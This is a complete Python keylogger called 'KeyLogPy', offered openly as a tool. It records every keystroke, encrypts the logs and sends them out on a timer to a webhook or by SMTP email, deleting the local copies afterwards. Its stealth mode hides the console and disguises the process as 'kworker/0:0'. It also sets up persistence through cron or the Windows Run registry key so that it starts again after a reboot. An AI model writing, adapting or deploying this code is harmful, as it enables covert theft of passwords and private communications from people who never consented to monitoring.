#!/usr/bin/env python3
"""
KeyLogPy — Config-driven keystroke logger with encrypted exfiltration.
Ops style: logging everywhere, exception handling on everything file-related.
"""

import argparse
import base64
import json
import logging
import os
import shutil
import signal
import smtplib
import struct
import sys
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Optional

logger = logging.getLogger("keylogpy")


# ---------------------------------------------------------------------------
# CryptoEngine — AES-256-CBC + HMAC
# ---------------------------------------------------------------------------

class CryptoEngine:
    """AES-256-CBC encryption with HMAC-SHA256 authentication."""

    BLOCK_SIZE = 16
    KEY_SIZE = 32  # AES-256
    HMAC_SIZE = 32  # SHA-256
    MAGIC = b"KLP1"

    def __init__(self, key: bytes):
        if len(key) != self.KEY_SIZE:
            raise ValueError(f"Key must be {self.KEY_SIZE} bytes (got {len(key)})")
        self.key = key

    @classmethod
    def generate_key(cls) -> bytes:
        return os.urandom(cls.KEY_SIZE)

    @classmethod
    def from_hex(cls, hex_key: str) -> "CryptoEngine":
        key = bytes.fromhex(hex_key)
        return cls(key)

    def encrypt(self, plaintext: bytes) -> bytes:
        from Crypto.Cipher import AES
        from Crypto.Hash import HMAC, SHA256

        iv = os.urandom(self.BLOCK_SIZE)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        padded = self._pad(plaintext)
        ciphertext = cipher.encrypt(padded)

        h = HMAC.new(self.key, digestmod=SHA256)
        h.update(self.MAGIC)
        h.update(iv)
        h.update(ciphertext)

        return self.MAGIC + iv + ciphertext + h.digest()

    def decrypt(self, data: bytes) -> bytes:
        from Crypto.Cipher import AES
        from Crypto.Hash import HMAC, SHA256

        if len(data) < len(self.MAGIC) + self.BLOCK_SIZE + self.HMAC_SIZE:
            raise ValueError("Data too short")

        magic = data[:4]
        if magic != self.MAGIC:
            raise ValueError(f"Bad magic: {magic!r}")

        iv = data[4:20]
        hmac_rx = data[-self.HMAC_SIZE:]
        ciphertext = data[20:-self.HMAC_SIZE]

        h = HMAC.new(self.key, digestmod=SHA256)
        h.update(self.MAGIC)
        h.update(iv)
        h.update(ciphertext)
        try:
            h.verify(hmac_rx)
        except ValueError:
            raise ValueError("HMAC mismatch — data corrupted or wrong key")

        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        padded = cipher.decrypt(ciphertext)
        return self._unpad(padded)

    def _pad(self, data: bytes) -> bytes:
        pad_len = self.BLOCK_SIZE - (len(data) % self.BLOCK_SIZE)
        return data + bytes([pad_len] * pad_len)

    def _unpad(self, data: bytes) -> bytes:
        if len(data) == 0:
            return data
        pad_len = data[-1]
        if pad_len > self.BLOCK_SIZE or pad_len == 0:
            raise ValueError("Invalid padding")
        for b in data[-pad_len:]:
            if b != pad_len:
                raise ValueError("Invalid padding bytes")
        return data[:-pad_len]


# ---------------------------------------------------------------------------
# ConfigManager — merges CLI, env, file
# ---------------------------------------------------------------------------

class ConfigManager:
    """Load and merge configuration from CLI args, env vars, and config file."""

    DEFAULTS = {
        "log_dir": str(Path.home() / ".keylogpy"),
        "rotation": 1000,
        "interval": 300,
        "stealth": False,
        "no_startup": False,
        "webhook": "",
        "smtp_server": "",
        "smtp_user": "",
        "smtp_pass": "",
        "smtp_to": "",
    }

    def __init__(self, args: Optional[dict] = None):
        self.config = dict(self.DEFAULTS)
        self._load_env()
        if args:
            self._merge(args)

    def _load_env(self):
        mapping = {
            "KLP_LOG_DIR": "log_dir",
            "KLP_ROTATION": "rotation",
            "KLP_INTERVAL": "interval",
            "KLP_STEALTH": "stealth",
            "KLP_WEBHOOK": "webhook",
            "KLP_SMTP_SERVER": "smtp_server",
            "KLP_SMTP_USER": "smtp_user",
            "KLP_SMTP_PASS": "smtp_pass",
            "KLP_SMTP_TO": "smtp_to",
        }
        for env_key, cfg_key in mapping.items():
            val = os.environ.get(env_key)
            if val is not None:
                if cfg_key in ("stealth",):
                    self.config[cfg_key] = val.lower() in ("1", "true", "yes")
                elif cfg_key in ("rotation", "interval"):
                    try:
                        self.config[cfg_key] = int(val)
                    except ValueError:
                        logger.warning(f"Invalid env {env_key}={val}, using default")
                else:
                    self.config[cfg_key] = val

    def _merge(self, args: dict):
        for k, v in args.items():
            if v is not None and v is not False:
                self.config[k] = v

    def get(self, key: str, default=None):
        return self.config.get(key, default)

    def __getitem__(self, key):
        return self.config[key]

    def __contains__(self, key):
        return key in self.config


# ---------------------------------------------------------------------------
# LogManager — buffered, rotating, encrypted write
# ---------------------------------------------------------------------------

class LogManager:
    """Handles buffered writes to encrypted log files with rotation."""

    def __init__(self, config: ConfigManager, crypto: CryptoEngine):
        self.config = config
        self.crypto = crypto
        self.buffer: list[str] = []
        self.count = 0
        self.lock = threading.RLock()
        self.rotation_size = config.get("rotation", 1000)
        self.log_dir = Path(config["log_dir"])
        self._seq = 0
        self._ensure_dir()

    def _ensure_dir(self):
        try:
            self.log_dir.mkdir(parents=True, exist_ok=True)
            logger.info(f"Log directory: {self.log_dir}")
        except OSError as e:
            logger.error(f"Failed to create log dir: {e}")
            raise

    def write(self, key_str: str):
        with self.lock:
            self.buffer.append(key_str)
            self.count += 1
            if self.count >= self.rotation_size:
                self.flush()

    def flush(self):
        with self.lock:
            if not self.buffer:
                return
            data = "\n".join(self.buffer).encode("utf-8")
            self.buffer.clear()
            self.count = 0

        try:
            encrypted = self.crypto.encrypt(data)
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            fname = self.log_dir / f"klp_{ts}_{self._seq:04d}.klp"
            self._seq += 1
            with open(fname, "wb") as f:
                f.write(encrypted)
            logger.info(f"Wrote {len(encrypted)} bytes to {fname}")
        except OSError as e:
            logger.error(f"Failed to write log file: {e}")
        except Exception as e:
            logger.exception(f"Unexpected error writing log: {e}")

    def close(self):
        logger.info("Closing log manager, flushing buffer")
        self.flush()


# ---------------------------------------------------------------------------
# KeyListener — wraps pynput
# ---------------------------------------------------------------------------

class KeyListener:
    """Wraps pynput's Listener, writes to LogManager."""

    def __init__(self, log_mgr: LogManager):
        self.log_mgr = log_mgr
        self.listener = None
        self._running = False

    def _on_press(self, key):
        try:
            k = key.char if hasattr(key, "char") and key.char else str(key)
            self.log_mgr.write(k)
        except Exception as e:
            logger.debug(f"Key processing error: {e}")

    def start(self):
        from pynput.keyboard import Listener

        self._running = True
        self.listener = Listener(on_press=self._on_press)
        self.listener.start()
        logger.info("KeyListener started")

    def stop(self):
        self._running = False
        if self.listener:
            self.listener.stop()
            logger.info("KeyListener stopped")


# ---------------------------------------------------------------------------
# Exfiltrator — webhook + SMTP
# ---------------------------------------------------------------------------

class Exfiltrator:
    """Encrypted exfiltration via webhook or SMTP."""

    def __init__(self, config: ConfigManager, crypto: CryptoEngine):
        self.config = config
        self.crypto = crypto
        self._stop = threading.Event()
        self._thread: Optional[threading.Thread] = None

    def start(self):
        interval = self.config.get("interval", 300)
        self._thread = threading.Thread(target=self._loop, args=(interval,), daemon=True)
        self._thread.start()
        logger.info(f"Exfiltrator started (interval={interval}s)")

    def _loop(self, interval: int):
        while not self._stop.wait(interval):
            try:
                self._exfiltrate()
            except Exception as e:
                logger.error(f"Exfiltration failed: {e}")

    def _exfiltrate(self):
        payload = self._collect_logs()
        if not payload:
            logger.debug("No logs to exfiltrate")
            return

        webhook = self.config.get("webhook", "")
        smtp_server = self.config.get("smtp_server", "")

        if webhook:
            self._webhook_send(webhook, payload)
        if smtp_server:
            self._smtp_send(payload)

    def _collect_logs(self) -> bytes:
        log_dir = Path(self.config["log_dir"])
        if not log_dir.exists():
            return b""
        data = b""
        try:
            for f in sorted(log_dir.glob("klp_*.klp")):
                data += f.read_bytes()
                f.unlink()
        except OSError as e:
            logger.error(f"Failed to collect logs: {e}")
        return data

    def _webhook_send(self, url: str, data: bytes):
        import requests
        try:
            b64 = base64.b64encode(data).decode()
            r = requests.post(url, json={"data": b64, "format": "klp"}, timeout=30)
            logger.info(f"Webhook exfil: {r.status_code}")
        except requests.RequestException as e:
            logger.error(f"Webhook failed: {e}")

    def _smtp_send(self, data: bytes):
        server = self.config.get("smtp_server", "")
        user = self.config.get("smtp_user", "")
        passwd = self.config.get("smtp_pass", "")
        to = self.config.get("smtp_to", "")

        if not server or not to:
            logger.warning("SMTP not fully configured")
            return

        try:
            msg = smtplib.SMTP(server, timeout=30)
            msg.ehlo()
            if msg.has_extn("STARTTLS"):
                msg.starttls()
                msg.ehlo()
            if user and passwd:
                msg.login(user, passwd)
            b64 = base64.b64encode(data).decode()
            body = f"Subject: KLP Report\n\n{b64}"
            msg.sendmail(user or "klp@local", [to], body)
            msg.quit()
            logger.info(f"SMTP exfil to {to}")
        except smtplib.SMTPException as e:
            logger.error(f"SMTP failed: {e}")

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=10)
            logger.info("Exfiltrator stopped")


# ---------------------------------------------------------------------------
# StealthManager
# ---------------------------------------------------------------------------

class StealthManager:
    """Platform-specific process hiding and persistence."""

    @staticmethod
    def hide_console():
        import platform
        system = platform.system()
        if system == "Windows":
            try:
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except Exception as e:
                logger.warning(f"Failed to hide console: {e}")
        elif system == "Linux":
            # Fork + detach. FIXME: Doesn't work if already daemonized
            try:
                if os.fork() > 0:
                    sys.exit(0)
            except OSError as e:
                logger.warning(f"Fork failed: {e}")

    @staticmethod
    def rename_process(name: str = "kworker/0:0"):
        import platform
        try:
            if platform.system() == "Linux":
                import ctypes
                libc = ctypes.CDLL("libc.so.6")
                libc.prctl(15, name.encode())  # PR_SET_NAME
            elif platform.system() == "Darwin":
                try:
                    import setproctitle
                    setproctitle.setproctitle(name)
                except ImportError:
                    logger.warning("setproctitle not installed, cannot rename")
        except Exception as e:
            logger.warning(f"Process rename failed: {e}")

    @staticmethod
    def install_persistence(config: ConfigManager):
        import platform
        system = platform.system()
        script = sys.argv[0] if sys.argv else "keylogpy.py"

        if system == "Linux":
            cron_line = f"@reboot python3 {os.path.abspath(script)} start --stealth --log-dir {config['log_dir']}\n"
            try:
                with open("/etc/cron.d/keylogpy", "w") as f:
                    f.write(cron_line)
                logger.info("Added cron persistence")
            except PermissionError:
                # Try user crontab
                try:
                    import subprocess
                    import shlex
                    subprocess.run(["crontab", "-l"], capture_output=True)
                    subprocess.run(
                        ["sh", "-c", f'(crontab -l 2>/dev/null; echo {shlex.quote(cron_line)}) | crontab -']
                    )
                    logger.info("Added user crontab persistence")
                except Exception as e:
                    logger.warning(f"Could not install cron: {e}")
        elif system == "Windows":
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                                    0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "KeyLogPy", 0, winreg.REG_SZ,
                                f'pythonw.exe "{os.path.abspath(script)}" start --stealth')
                winreg.CloseKey(key)
                logger.info("Added Windows registry persistence")
            except Exception as e:
                logger.warning(f"Registry persistence failed: {e}")

    @staticmethod
    def remove_persistence():
        import platform
        if platform.system() == "Linux":
            try:
                os.remove("/etc/cron.d/keylogpy")
            except (FileNotFoundError, PermissionError):
                pass
            try:
                import subprocess
                subprocess.run('crontab -l 2>/dev/null | grep -v "keylogpy" | crontab -', shell=True)
            except Exception:
                pass
        elif platform.system() == "Windows":
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                                    0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "KeyLogPy")
                winreg.CloseKey(key)
            except Exception:
                pass


# ---------------------------------------------------------------------------
# Main application
# ---------------------------------------------------------------------------

class KeyLogPyApp:
    """Main application controller."""

    def __init__(self, config: ConfigManager):
        self.config = config
        self.crypto = None
        self.log_mgr = None
        self.listener = None
        self.exfiltrator = None
        self._running = False
        self._pid_file = Path(config["log_dir"]) / "keylogpy.pid"

    def initialize(self):
        try:
            key_file = Path(self.config["log_dir"]) / "key.hex"
            if key_file.exists():
                with open(key_file) as f:
                    hex_key = f.read().strip()
                self.crypto = CryptoEngine.from_hex(hex_key)
                logger.info("Loaded existing encryption key")
            else:
                self.crypto = CryptoEngine(CryptoEngine.generate_key())
                self.config["log_dir"].mkdir(parents=True, exist_ok=True)
                with open(key_file, "w") as f:
                    f.write(self.crypto.key.hex())
                logger.info(f"Generated new encryption key -> {key_file}")

            self.log_mgr = LogManager(self.config, self.crypto)
        except Exception as e:
            logger.exception(f"Initialization failed: {e}")
            raise

    def start(self):
        if self._running:
            logger.warning("Already running")
            return

        try:
            self.initialize()

            if self.config.get("stealth", False):
                StealthManager.hide_console()
                StealthManager.rename_process()
                if not self.config.get("no_startup", False):
                    StealthManager.install_persistence(self.config)

            self.listener = KeyListener(self.log_mgr)
            self.listener.start()

            self.exfiltrator = Exfiltrator(self.config, self.crypto)
            self.exfiltrator.start()

            self._running = True
            self._write_pid()
            logger.info("KeyLogPy started successfully")

            # Block
            try:
                while self._running:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.stop()

        except Exception as e:
            logger.exception(f"Failed to start: {e}")
            sys.exit(1)

    def stop(self):
        logger.info("Shutting down...")
        self._running = False
        if self.listener:
            self.listener.stop()
        if self.exfiltrator:
            self.exfiltrator.stop()
        if self.log_mgr:
            self.log_mgr.close()
        self._remove_pid()
        logger.info("KeyLogPy stopped")

    def status(self) -> dict:
        pid_path = self._pid_file
        running = pid_path.exists()
        info = {
            "running": running,
            "log_dir": str(self.config.get("log_dir", "")),
            "stealth": self.config.get("stealth", False),
            "webhook": bool(self.config.get("webhook", "")),
            "smtp": bool(self.config.get("smtp_server", "")),
        }
        if running:
            try:
                with open(pid_path) as f:
                    info["pid"] = int(f.read().strip())
            except (ValueError, OSError):
                info["pid"] = None
        return info

    def _write_pid(self):
        try:
            Path(self.config["log_dir"]).mkdir(parents=True, exist_ok=True)
            with open(self._pid_file, "w") as f:
                f.write(str(os.getpid()))
        except OSError as e:
            logger.warning(f"Failed to write PID file: {e}")

    def _remove_pid(self):
        try:
            if self._pid_file.exists():
                self._pid_file.unlink()
        except OSError as e:
            logger.warning(f"Failed to remove PID file: {e}")

    @staticmethod
    def decrypt_file(key_hex: str, file_path: str, output: Optional[str] = None):
        try:
            crypto = CryptoEngine.from_hex(key_hex)
            with open(file_path, "rb") as f:
                data = f.read()
            plain = crypto.decrypt(data)
            out = output or file_path + ".txt"
            with open(out, "w") as f:
                f.write(plain.decode("utf-8", errors="replace"))
            print(f"Decrypted -> {out}")
        except Exception as e:
            logger.error(f"Decryption failed: {e}")
            sys.exit(1)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def build_parser():
    p = argparse.ArgumentParser(prog="keylogpy", description="Keystroke logger with encrypted exfil")
    sub = p.add_subparsers(dest="command", required=True)

    start_p = sub.add_parser("start", help="Start keylogging")
    start_p.add_argument("--log-dir", help="Log directory")
    start_p.add_argument("--rotation", type=int, help="Keystrokes per file")
    start_p.add_argument("--interval", type=int, help="Exfiltration interval (sec)")
    start_p.add_argument("--webhook", help="HTTPS exfiltration endpoint")
    start_p.add_argument("--smtp-server", help="SMTP server")
    start_p.add_argument("--smtp-user", help="SMTP user")
    start_p.add_argument("--smtp-pass", help="SMTP password")
    start_p.add_argument("--smtp-to", help="SMTP recipient")
    start_p.add_argument("--stealth", action="store_true", help="Enable stealth mode")
    start_p.add_argument("--no-startup", action="store_true", help="Skip persistence")

    stop_p = sub.add_parser("stop", help="Stop keylogging")
    status_p = sub.add_parser("status", help="Check status")
    decrypt_p = sub.add_parser("decrypt", help="Decrypt a log file")
    decrypt_p.add_argument("--key", required=True, help="Encryption key (hex)")
    decrypt_p.add_argument("--file", required=True, help="Encrypted .klp file")
    decrypt_p.add_argument("--output", help="Output file path")

    return p


def main():
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        handlers=[logging.StreamHandler(), logging.FileHandler("/tmp/keylogpy.log")],
    )

    parser = build_parser()
    args = parser.parse_args()

    cfg = ConfigManager(vars(args) if args.command != "decrypt" else None)

    if args.command == "start":
        app = KeyLogPyApp(cfg)
        app.start()
    elif args.command == "stop":
        app = KeyLogPyApp(cfg)
        app.stop()
    elif args.command == "status":
        app = KeyLogPyApp(cfg)
        st = app.status()
        print(f"Running: {st['running']}")
        if st.get("pid"):
            print(f"PID: {st['pid']}")
        print(f"Log dir: {st['log_dir']}")
        print(f"Stealth: {st['stealth']}")
        print(f"Webhook: {st['webhook']}")
        print(f"SMTP: {st['smtp']}")
    elif args.command == "decrypt":
        KeyLogPyApp.decrypt_file(args.key, args.file, args.output)


if __name__ == "__main__":
    main()
